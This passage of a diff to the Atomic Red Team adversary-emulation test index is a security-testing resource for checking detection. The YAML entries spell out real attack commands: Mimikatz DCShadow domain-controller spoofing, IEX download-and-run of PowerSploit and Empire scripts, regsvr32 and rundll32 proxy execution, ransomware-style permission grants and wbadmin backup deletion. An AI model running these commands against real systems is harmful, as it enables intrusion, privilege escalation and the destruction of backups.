+        command: "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{filename} scrobj.dll\n"
         name: command_prompt
     - name: Regsvr32 remote COM scriptlet execution
       auto_generated_guid: c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36
@@ -37231,10 +38292,16 @@ defense-evasion:
           description: URL to hosted sct file
           type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: Path
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
       executor:
-        command: 'regsvr32.exe /s /u /i:#{url} scrobj.dll
-
-'
+        command: "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n"
         name: command_prompt
     - name: Regsvr32 local DLL execution
       auto_generated_guid: '08ffca73-9a3d-471a-aeb0-68b4aa3ab37b'
@@ -37249,6 +38316,14 @@ defense-evasion:
           description: Name of DLL to Execute, DLL Should export DllRegisterServer
           type: Path
           default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: Path
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
       dependency_executor_name: powershell
       dependencies:
       - description: 'AllTheThingsx86.dll must exist on disk at specified location
@@ -37263,7 +38338,7 @@ defense-evasion:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
       executor:
         command: 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
-          /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
+          /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
 
 '
         name: command_prompt
@@ -37280,6 +38355,14 @@ defense-evasion:
           description: Path to renamed dll file to be registered
           type: Path
           default: "%temp%\\shell32.jpg"
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: Path
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
       dependency_executor_name: command_prompt
       dependencies:
       - description: 'Test requires a renamed dll file
@@ -37294,12 +38377,39 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'regsvr32 /s #{dll_file}
-
-'
-        cleanup_command: 'regsvr32 /U /s #{dll_file}
-
-'
+        command: "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n"
+        cleanup_command: "#{regsvr32path}\\#{regsvr32name} /U /s #{dll_file}\n"
+    - name: Regsvr32 Silent DLL Install Call DllRegisterServer
+      auto_generated_guid: 9d71c492-ea2e-4c08-af16-c6994cdf029f
+      description: Regsvr32.exe is a command-line program used to register and unregister
+        OLE controls. Normally, an install is executed with /n to prevent calling
+        DllRegisterServer.
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_name:
+          description: Name of DLL to Install
+          type: String
+          default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: String
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: AllTheThingsx86.dll must exist on disk at specified location
+          (#{dll_name})
+        prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
+      executor:
+        command: "#{regsvr32path}\\#{regsvr32name} /s /i #{dll_name}"
+        name: command_prompt
   T1036.003:
     technique:
       external_references:
@@ -37751,19 +38861,94 @@ defense-evasion:
     - name: DCShadow - Mimikatz
       auto_generated_guid: 0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6
       description: |
-        Utilize Mimikatz DCShadow method to simulate behavior of a Domain Controller
+        Use Mimikatz DCShadow method to simulate behavior of a Domain Controller and edit protected attribute.
 
         [DCShadow](https://www.dcshadow.com/)
         [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
+
+        It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
+        Get-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount
+
+        Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
+        The easiest is to run elevated and as a Domain Admin user.
       supported_platforms:
       - windows
+      input_arguments:
+        object:
+          description: Targeted object (for machine account do not forget to add final
+            '$')
+          type: string
+          default: bruce.wayne
+        attribute:
+          description: 'Object attribute to edit, interesting ones: badpwdcount, primaryGroupId,
+            SIDHistory...'
+          type: string
+          default: badpwdcount
+        value:
+          description: Value to assign to object attribute
+          type: string
+          default: 9999
+        mimikatz_path:
+          description: Mimikatz windows executable
+          type: path
+          default: "$env:TEMP\\mimikatz\\x64\\mimikatz.exe"
+        psexec_path:
+          description: Path to PsExec
+          type: string
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
+
+'
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      - description: 'PsExec tool from Sysinternals must exist on disk at specified
+          location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
       executor:
-        steps: |
-          1. Start Mimikatz and use !processtoken (and not token::elevate - as it elevates a thread) to escalate to SYSTEM.
-          2. Start another mimikatz with DA privileges. This is the instance which registers a DC and is used to "push" the attributes.
-          3. lsadump::dcshadow /object:ops-user19$ /attribute:userAccountControl /value:532480
-          4. lsadump::dcshadow /push
-        name: manual
+        name: powershell
+        elevation_required: true
+        command: |
+          # starting fake DC server, as SYSTEM (required)
+          $dc_output_file = "$env:TEMP\art-T1207-mimikatz-DC.log"
+          Remove-Item $dc_output_file -ErrorAction Ignore
+          $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`" `"exit`""
+          $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c #{psexec_path} /accepteula -d -s #{mimikatz_path} $mimikatzParam"
+
+          # wait for fake DC server to be ready...
+          Start-Sleep -Seconds 5
+
+          # server ready, so trigger replication (push) and wait until it finished
+          & #{mimikatz_path} "lsadump::dcshadow /push" "exit"
+
+          Write-Host "`nWaiting for fake DC server to return"
+          Wait-Process $dc
+
+          Write-Host "`nOutput from fake DC server:"
+          Get-Content $dc_output_file
+          Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
+          Remove-Item $dc_output_file -ErrorAction Ignore
+
+          Write-Host "End of DCShadow"
+        cleanup_command: Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
   T1014:
     technique:
       id: attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b
@@ -38262,6 +39447,24 @@ defense-evasion:
         command: |
           rundll32.exe url.dll,OpenURL PathToAtomicsFolder\T1218.011\src\index.hta
           rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\T1218.011\src\akteullen.vbs
+        name: command_prompt
+    - name: Launches an executable using Rundll32 and pcwutl.dll
+      auto_generated_guid: 9f5d081a-ee5a-42f9-a04e-b7bdc487e676
+      description: 'Executes the LaunchApplication function in pcwutl.dll to proxy
+        execution of an executable.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_to_launch:
+          description: Path of the executable to launch
+          type: path
+          default: "%windir%\\System32\\notepad.exe"
+      executor:
+        command: 'rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
+
+'
         name: command_prompt
   T1134.005:
     technique:
@@ -38999,10 +40202,6 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        microsoft_wordpath:
-          description: path to office folder
-          type: path
-          default: C:\Program Files\Microsoft Office\Office16
         remote_url:
           description: url to document
           type: url
@@ -39013,8 +40212,8 @@ defense-evasion:
           must be provided
 
 '
-        prereq_command: 'if (Test-Path "#{microsoft_wordpath}\protocolhandler.exe")
-          {exit 0} else {exit 1}
+        prereq_command: 'if (Test-Path "(Resolve-Path "C:\Program Files*\Microsoft
+          Office\root\Office16")\protocolhandler.exe") {exit 0} else {exit 1}
 
 '
         get_prereq_command: 'write-host "Install Microsoft Word or provide correct
@@ -39024,9 +40223,9 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: '"#{microsoft_wordpath}\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
-
-'
+        command: |
+          FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
+          call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
     - name: Microsoft.Workflow.Compiler.exe Payload Execution
       auto_generated_guid: 7cbb0f26-a4c1-4f77-b180-a009aa05637e
       description: 'Emulates attack with Microsoft.Workflow.Compiler.exe running a
@@ -39040,11 +40239,19 @@ defense-evasion:
           description: XML to execution
           type: path
           default: PathToAtomicsFolder\T1218\src\T1218.xml
+        mwcpath:
+          description: Default location of Microsoft.Workflow.Compiler.exe
+          type: Path
+          default: C:\Windows\Microsoft.NET\Framework64\v4.0.30319
+        mwcname:
+          description: Default name of microsoft.workflow.compiler.exe
+          type: Path
+          default: microsoft.workflow.compiler.exe
       dependency_executor_name: powershell
       dependencies:
       - description: ".Net must be installed for this test to work correctly.\n"
-        prereq_command: 'if (Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
-          ) {exit 0} else {exit 1}
+        prereq_command: 'if (Test-Path #{mwcpath}\#{mwcname} ) {exit 0} else {exit
+          1}
 
 '
         get_prereq_command: 'write-host ".Net must be installed for this test to work
@@ -39052,9 +40259,9 @@ defense-evasion:
 
 '
       executor:
-        command: |
-          Set-Location -path PathToAtomicsFolder\T1218\src ;
-          C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe "#{xml_payload}" output.txt
+        command: '#{mwcpath}\#{mwcname} "#{xml_payload}" output.txt
+
+'
         name: powershell
         elevation_required: false
     - name: Renamed Microsoft.Workflow.Compiler.exe Payload Executions
@@ -39074,20 +40281,26 @@ defense-evasion:
           description: renamed Microsoft.Workflow.Compiler
           type: path
           default: PathToAtomicsFolder\T1218\src\svchost.exe
+        mwcpath:
+          description: Default location of Microsoft.Workflow.Compiler.exe
+          type: Path
+          default: C:\Windows\Microsoft.NET\Framework64\v4.0.30319
+        mwcname:
+          description: Default name of microsoft.workflow.compiler.exe
+          type: Path
+          default: microsoft.workflow.compiler.exe
       dependency_executor_name: powershell
       dependencies:
       - description: ".Net must be installed for this test to work correctly.\n"
         prereq_command: |
-          Copy-Item C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe "#{renamed_binary}" -Force
+          Copy-Item #{mwcpath}\#{mwcname} "#{renamed_binary}" -Force
           if (Test-Path "#{renamed_binary}") {exit 0} else {exit 1}
         get_prereq_command: 'write-host "you need to rename workflow complier before
           you run this test"
 
 '
       executor:
-        command: |
-          Set-Location -path PathToAtomicsFolder\T1218\src ;
-          #{renamed_binary} #{xml_payload} output.txt
+        command: "#{renamed_binary} #{xml_payload} output.txt\n"
         name: powershell
         elevation_required: false
     - name: Invoke-ATHRemoteFXvGPUDisablementCommand base test
@@ -40024,7 +41237,37 @@ defense-evasion:
       - Brian Wiltse @evalstrings
       - Patrick Campbell, @pjcampbe11
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1221
+    atomic_tests:
+    - name: WINWORD Remote Template Injection
+      auto_generated_guid: 1489e08a-82c7-44ee-b769-51b72d03521d
+      description: 'Open a .docx file that loads a remote .dotm macro enabled template.
+        Executes the code specified within the .dotm template.Requires download of
+        WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  Opens
+        Calculator.exe when test sucessfully executed, while AV turned off.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        docx file:
+          description: Location of the test docx file on the local filesystem.
+          type: Path
+          default: PathToAtomicsFolder\T1221\src\Calculator.docx
+        dotm template:
+          description: Location of the test dotm template on the remote server.
+          type: Path
+          default: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm
+      dependency_executor_name: powershell
+      dependencies:
+      - description: ''
+        prereq_command: ''
+        get_prereq_command: ''
+      executor:
+        command: 'start PathToAtomicsFolder\T1221\src\Calculator.docx
+
+'
+        name: command_prompt
   T1055.003:
     technique:
       external_references:
@@ -40554,8 +41797,8 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
-          Get-System -Technique NamedPipe -Verbose
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
+          -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
         name: powershell
         elevation_required: true
     - name: "`SeDebugPrivilege` token duplication"
@@ -40566,8 +41809,8 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
-          Get-System -Technique Token -Verbose
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'
+          -UseBasicParsing); Get-System -Technique Token -Verbose
         name: powershell
         elevation_required: true
   T1205:
@@ -41563,15 +42806,24 @@ defense-evasion:
           del #{file_or_folder}\T1222.001_attrib*.txt
           rmdir #{file_or_folder}
         name: command_prompt
-    - name: Grant Full Access to Entire C:\ Drive for Everyone - Ryuk Ransomware Style
+    - name: Grant Full Access to folder for Everyone - Ryuk Ransomware Style
       auto_generated_guid: ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6
-      description: Invokes the command line used by Ryuk Ransomware to grant full
-        access to the entire C:\ drive for Everyone.
+      description: |
+        Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\ drive for Everyone.
+        **icacls "C:\*" /grant Everyone:F /T /C /Q**
+        However, for this atomic we set the permission on C:\Users\Public so it completes faster and doesn't irreversibly affect the host.
+        You can set your own path variable to "C:\*" if you prefer.
       supported_platforms:
       - windows
+      input_arguments:
+        path:
+          description: Path of folder to recursively set permissions on
+          type: path
+          default: C:\Users\Public\*
       executor:
-        command: icacls "C:\*" /grant Everyone:F /T /C /Q
-        name: powershell
+        command: icacls "#{path}" /grant Everyone:F /T /C /Q
+        name: command_prompt
+        elevation_required: true
   T1220:
     technique:
       id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
@@ -42147,20 +43399,10 @@ impact:
           Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "$env:TEMP\SDelete.zip"
           Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
           Remove-Item $env:TEMP\SDelete.zip -Force
-      - description: 'The file to delete must exist at #{file_to_delete}
-
-'
-        prereq_command: 'if (Test-Path #{file_to_delete}) { exit 0 } else { exit 1
-          }
-
-'
-        get_prereq_command: 'New-Item #{file_to_delete} -Force | Out-Null
-
-'
       executor:
-        command: 'Invoke-Expression -Command "#{sdelete_exe} -accepteula #{file_to_delete}"
-
-'
+        command: |
+          if (-not (Test-Path #{file_to_delete})) { New-Item #{file_to_delete} -Force }
+          Invoke-Expression -Command "#{sdelete_exe} -accepteula #{file_to_delete}"
         name: powershell
     - name: macOS/Linux - Overwrite file with DD
       auto_generated_guid: 38deee99-fd65-4031-bec8-bfa4f9f26146
@@ -42917,7 +44159,7 @@ impact:
 '
         name: command_prompt
         elevation_required: true
-    - name: Windows - Delete Windows Backup Catalog
+    - name: Windows - wbadmin Delete Windows Backup Catalog
       auto_generated_guid: 263ba6cb-ea2b-41c9-9d4e-b652dadd002c
       description: |
         Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
@@ -42925,7 +44167,7 @@ impact:
       supported_platforms:
       - windows
       executor:
-        command: 'wbadmin.exe delete catalog -quiet
+        command: 'wbadmin delete catalog -quiet
 
 '
         name: command_prompt
@@ -42971,6 +44213,21 @@ impact:
       executor:
         command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
           c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Windows - wbadmin Delete systemstatebackup
+      auto_generated_guid: 584331dd-75bc-4c02-9e0b-17f5fd81c748
+      description: 'Deletes the Windows systemstatebackup using wbadmin.exe. This
+        technique is used by numerous ransomware families. This may only be successful
+        on server platforms that have Windows Backup enabled.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'wbadmin delete systemstatebackup -keepVersions:0
 
 '
         name: command_prompt
@@ -43027,7 +44284,55 @@ impact:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1491.001
+    atomic_tests:
+    - name: Replace Desktop Wallpaper
+      auto_generated_guid: 30558d53-9d76-41c4-9267-a7bd5184bed3
+      description: 'Downloads an image from a URL and sets it as the desktop wallpaper.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        url_of_wallpaper:
+          description: URL pointing to the image file you wish to set as wallpaper
+          type: url
+          default: https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png
+        pointer_to_orginal_wallpaper:
+          description: Full path to where a file containing the original wallpaper
+            location will be saved
+          type: String
+          default: "$env:TEMP\\T1491.001-OrginalWallpaperLocation"
+        wallpaper_location:
+          description: Full path to where the downloaded wallpaper image will be saved
+          type: String
+          default: "$env:TEMP\\T1491.001-newWallpaper.png"
+      executor:
+        command: "$url = \"#{url_of_wallpaper}\"\n$imgLocation = \"#{wallpaper_location}\"\n$orgWallpaper
+          = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\'
+          -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"\n$updateWallpapercode
+          = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public
+          class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)]
+          \n         static extern int SystemParametersInfo (int uAction , int uParam
+          , string lpvParam , int fuWinIni) ; \n         \n         public static
+          void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);
+          \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{
+          \ \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode
+          \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{
+          \ \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode
+          \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n
+          \   $wc.Dispose()  \n}\n"
+        cleanup_command: "$updateWallpapercode = @' \nusing System.Runtime.InteropServices;
+          \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\",
+          CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo
+          (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n
+          \        public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);
+          \n        }\n    }\n} \n'@\nif (Test-Path -Path #{pointer_to_orginal_wallpaper}
+          -PathType Leaf) {\n     $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\"\n
+          \    add-type $updateWallpapercode \n     [Win32.Wallpaper]::SetWallpaper($orgImg)\n}\nRemove-Item
+          \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore\nRemove-Item \"#{wallpaper_location}\"
+          -ErrorAction Ignore\n"
+        name: powershell
   T1498:
     technique:
       external_references:
@@ -44842,8 +46147,8 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Find-LocalAdminAccess -Verbose
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Find-LocalAdminAccess -Verbose
 
 '
         name: powershell
@@ -44857,8 +46162,8 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Invoke-EnumerateLocalAdmin  -Verbose
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
 
 '
         name: powershell
@@ -44876,8 +46181,9 @@ discovery:
           type: Path
           default: "$env:COMPUTERNAME"
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose'
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name}
+          -Verbose'
         name: powershell
     - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
       auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
@@ -45379,7 +46685,6 @@ discovery:
 '
       supported_platforms:
       - linux
-      - macos
       input_arguments:
         output_file:
           description: Path where captured results will be placed
@@ -45785,6 +47090,38 @@ discovery:
         command: 'nmap #{host_to_scan}'
         name: powershell
         elevation_required: true
+    - name: Port Scan using python
+      auto_generated_guid: 6ca45b04-9f15-4424-b9d3-84a217285a5c
+      description: 'Scan ports to check for listening ports with python
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        host_ip:
+          description: Host to scan.
+          type: string
+          default: 127.0.0.1
+        filename:
+          description: Location of the project file
+          type: Path
+          default: PathToAtomicsFolder\T1046\src\T1046.py
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Check if python exists on the machine
+
+'
+        prereq_command: 'if (python --version) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "Python 3 must be installed manually"
+
+'
+      executor:
+        command: 'python #{filename} -i #{host_ip}
+
+'
+        name: powershell
   T1135:
     technique:
       id: attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f
@@ -45887,15 +47224,10 @@ discovery:
         Upon execution, avalaible network shares will be displayed in the powershell session
       supported_platforms:
       - windows
-      input_arguments:
-        computer_name:
-          description: Computer name to find a mount on.
-          type: string
-          default: localhost
       executor:
-        command: |
-          net view \\#{computer_name}
-          get-smbshare -Name #{computer_name}
+        command: 'get-smbshare
+
+'
         name: powershell
     - name: View available share drives
       auto_generated_guid: ab39a04f-0c93-4540-9ff2-83f862c385ae
@@ -45918,8 +47250,8 @@ discovery:
       supported_platforms:
       - windows
       executor:
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
-          Find-DomainShare -CheckShareAccess -Verbose
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
 
 '
         name: powershell
@@ -46058,11 +47390,19 @@ discovery:
         wireshark_url:
           description: wireshark installer download URL
           type: url
-          default: https://2.na.dl.wireshark.org/win64/Wireshark-win64-3.2.6.exe
+          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
         tshark_path:
           description: path to tshark.exe
           type: path
           default: c:\program files\wireshark\tshark.exe
+        npcap_url:
+          description: npcap installed download URL
+          type: url
+          default: https://nmap.org/npcap/dist/npcap-1.31.exe
+        npcap_path:
+          description: path to npcap.sys
+          type: path
+          default: C:\Program Files\Npcap\npcap.sys
       dependency_executor_name: powershell
       dependencies:
       - description: 'tshark must be installed and in the default path of "c:\Program
@@ -46073,6 +47413,13 @@ discovery:
         get_prereq_command: |
           Invoke-WebRequest -OutFile $env:temp\wireshark_installer.exe #{wireshark_url}
           Start-Process $env:temp\wireshark_installer.exe /S
+      - description: 'npcap must be installed.
+
+'
+        prereq_command: if (test-path "#{npcap_path}") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest -OutFile $env:temp\npcap_installer.exe #{npcap_url}
+          Start-Process $env:temp\npcap_installer.exe
       executor:
         command: '"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
 
@@ -46295,7 +47642,20 @@ discovery:
       - Process monitoring
       - Process command-line parameters
       x_mitre_is_subtechnique: false
-    atomic_tests: []
+      identifier: T1120
+    atomic_tests:
+    - name: Win32_PnPEntity Hardware Inventory
+      auto_generated_guid: 2cb4dbf2-2dca-4597-8678-4d39d207a3a5
+      description: Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
+          $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
+          @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
+        cleanup_command: Remove-Item $env:TEMP\T1120_collection.txt -ErrorAction Ignore
+        name: powershell
   T1069:
     technique:
       id: attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce
@@ -46906,19 +48266,29 @@ discovery:
           get-process | ?{$_.Description -like "*defender*"}
           get-process | ?{$_.Description -like "*cylance*"}
         name: powershell
-    - name: Security Software Discovery - ps
+    - name: Security Software Discovery - ps (macOS)
       auto_generated_guid: ba62ce11-e820-485f-9c17-6f3c857cd840
       description: |
         Methods to identify Security Software on an endpoint
-        when sucessfully executed, command shell  is going to display AV software it is running( Little snitch or carbon black ).
+        when sucessfully executed, command shell  is going to display AV/Security software it is running.
       supported_platforms:
-      - linux
       - macos
       executor:
-        command: |
-          ps -ef | grep Little\ Snitch | grep -v grep
-          ps aux | grep CbOsxSensorService
-          ps aux | grep falcond
+        command: 'ps aux | egrep ''Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu''
+
+'
+        name: sh
+    - name: Security Software Discovery - ps (Linux)
+      auto_generated_guid: 23b91cd2-c99c-4002-9e41-317c63e024a2
+      description: |
+        Methods to identify Security Software on an endpoint
+        when sucessfully executed, command shell  is going to display AV/Security software it is running.
+      supported_platforms:
+      - linux
+      executor:
+        command: 'ps aux | egrep ''falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd''
+
+'
         name: sh
     - name: Security Software Discovery - Sysmon Service
       auto_generated_guid: fe613cf3-8009-4446-9a0f-bc78a15b66c9
@@ -47384,6 +48754,19 @@ discovery:
         command: 'cscript #{vbscript}'
         name: powershell
         elevation_required: false
+    - name: Environment variables discovery
+      auto_generated_guid: f400d1c0-1804-4ff8-b069-ef5ddd2adbf3
+      description: 'Identify all environment variables. Upon execution, environments
+        variables and your path info will be displayed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'set
+
+'
+        name: command_prompt
   T1016:
     technique:
       id: attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0
@@ -47576,6 +48959,26 @@ discovery:
       executor:
